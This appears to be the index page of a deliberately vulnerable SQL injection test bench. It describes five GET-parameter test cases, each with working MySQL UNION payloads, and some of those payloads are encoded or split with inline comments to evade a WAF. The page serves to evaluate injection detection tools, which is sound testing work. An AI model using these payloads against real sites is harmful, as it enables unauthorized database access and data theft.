<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Evaluation of SQL Injection Detection Accuracy - HTTP GET Method</title>
</head>
<body>

<center><font size="5">Injection Test Cases - HTTP GET Method 500 Erroneous Responses:</font></center><br><br>
<B><a href="Case01-InjectionInSearch-RetrieveDatabaseVersionURLEncode-UnionObfuscationExploit.jsp?msg=textvalue">Case01-InjectionInSearch-RetrieveDatabaseVersionURLEncode-UnionObfuscationExploit.jsp</a></B><br>
  Injection into GET parameter in a page with erroneous responses.<br>
  Goal: retrieve the database version by injecting a URL-encoded payload.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  ' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 'or'7'='7<br>
  MySQL Exploit: <B>'%20UNION%20SELECT%201,%20@@version,%20'abcd'--%20</B><br>
  <br>

<B><a href="Case02-InjectionInSearch-RetrieveDatabaseVersionSpecialURLEncode-UnionObfuscationExploit.jsp?msg=textvalue">Case02-InjectionInSearch-RetrieveDatabaseVersionSpecialURLEncode-UnionObfuscationExploit.jsp</a></B><br>
  Injection into GET parameter in a page with erroneous responses.<br>
  Goal: retrieve the database version by injecting a URL-encoded payload (including 'special' characters).<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  ' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 'or'7'='7<br>
  MySQL Exploit: <B>%27%20UNION%20SELECT%201%2C%20%40%40version%2C%20%27abcd%27%2D%2D%20</B><br>
  <br>
  
  <B><a href="Case03-InjectionInSearch-RetrieveDatabaseVersionBypassWAF-UnionObfuscationExploit.jsp?msg=textvalue">Case03-InjectionInSearch-RetrieveDatabaseVersionBypassWAF-UnionObfuscationExploit.jsp</a></B><br>
  Injection into string values in the scope of a query within a search page with erroneous responses.<br>
    Goal: retrieve the database version by injecting a encoded payload to bypass WAF (e.g. HEX encode)
<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  ' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 'or'7'='7<br>
  MySQL Exploit: <B>%27%20%55nion(%53elect 1,@@version,3)%2D%2D%20</B><br>
  <br>
  
  <B><a href="Case04-InjectionInSearch-RetrieveDatabaseVersionInlineComments-UnionObfuscationExploit.jsp?msg=textvalue">Case04-InjectionInSearch-RetrieveDatabaseVersionInlineComments-UnionObfuscationExploit.jsp</a></B><br>
 Injection into GET parameter in a page with erroneous responses.<br>
   Goal: retrieve the database version by injecting a encoded payload containing an inline comments to bypass WAF.
<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  ' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 'or'7'='7<br>
  MySQL Exploit: <B>' /*!UnIoN*/SeLecT+1,@@version,3--%20</B><br>
  <br>
  
  <B><a href="Case05-InjectionInSearch-ListingDatabaseContentsInlineComments-UnionObfuscationExploit.jsp?msg=textvalue">Case05-InjectionInSearch-ListingDatabaseContentsInlineComments-UnionObfuscationExploit.jsp</a></B><br>
	Injection into GET parameter in a page with erroneous responses.<br>
    Goal: Listing database contents by injecting a encoded payload containing an inline comments to bypass WAF.<br>
    Hint: Inline comments can be used throughout the SQL statement so if table_name or information_schema are filtered we can
		add more inline comments.
<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  ' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 'or'7'='7<br>
  MySQL Exploit: <B>' /*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables+/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--%20</B><br>
  <br>
  
</body>
</html>